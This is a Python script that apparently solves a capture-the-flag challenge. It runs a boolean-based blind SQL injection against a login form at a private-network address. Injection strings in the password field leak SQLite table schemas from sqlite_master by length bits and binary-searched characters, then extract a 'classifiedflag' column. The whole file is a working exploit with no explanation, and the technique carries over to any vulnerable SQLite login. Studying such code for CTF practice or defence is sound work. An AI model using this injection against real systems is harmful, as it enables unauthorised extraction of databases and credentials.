import requests


REMOTE = "http://10.0.10.10:5003"
record = {"count": 0}

def char_is_above(table, column, index, guess, extra_criteria="1", offset=0):
    injection = "' OR (SELECT count(*) FROM (SELECT * FROM {table} WHERE {extra_criteria} ORDER BY 1 LIMIT 1 OFFSET {offset}) WHERE unicode(substr({column}, {index}, 1)) > {guess})=1;-- "
    r = requests.post(REMOTE + "/",
                      data={"username": "admin",
                            "password": injection.format(table=table,
                                                         extra_criteria=extra_criteria,
                                                         offset=offset,
                                                         column=column,
                                                         index=index,
                                                         guess=guess)})
    record["count"] += 1
    if r.status_code not in (200, 403):
        raise ValueError("Got weird code: %d" % r.status_code)
    return r.status_code == 200

def leak_length_bit(table, column, bit, extra_criteria="1", offset=0):
    injection = "' OR (SELECT count(*) FROM (SELECT * FROM {table} WHERE {extra_criteria} ORDER BY 1 LIMIT 1 OFFSET {offset}) WHERE (length({column}) >> {bit}) & 1)=1;-- "
    r = requests.post(REMOTE + "/",
                      data={"username": "admin",
                            "password": injection.format(table=table,
                                                         extra_criteria=extra_criteria,
                                                         offset=offset,
                                                         column=column,
                                                         bit=bit)})
    record["count"] += 1
    if r.status_code not in (200, 403):
        raise ValueError("Got weird code: %d" % r.status_code)
    return r.status_code == 200

def brute_char(table, column, index, extra_criteria="1", offset=0):
    left = 0
    right = 127
    while True:
        guess = int((left + right) / 2)
        if left == right:
            return chr(guess)
        elif char_is_above(table, column, index, guess, extra_criteria=extra_criteria, offset=offset):
            left = guess + 1
        else:
            right = guess

def brute_row(table, column, extra_criteria="1", offset=0):
    length = 0
    for i in xrange(32):
        length |= leak_length_bit(table, column, i, extra_criteria=extra_criteria, offset=offset) << i

    out = ""
    for i in xrange(1, length + 1):
        out += brute_char(table, column, i, extra_criteria=extra_criteria, offset=offset)
    return out

print(brute_row("sqlite_master", "sql", extra_criteria="type='table'"))
print(brute_row("sqlite_master", "sql", extra_criteria="type='table'", offset=1))
print(brute_row("excellenttablename", "classifiedflag"))
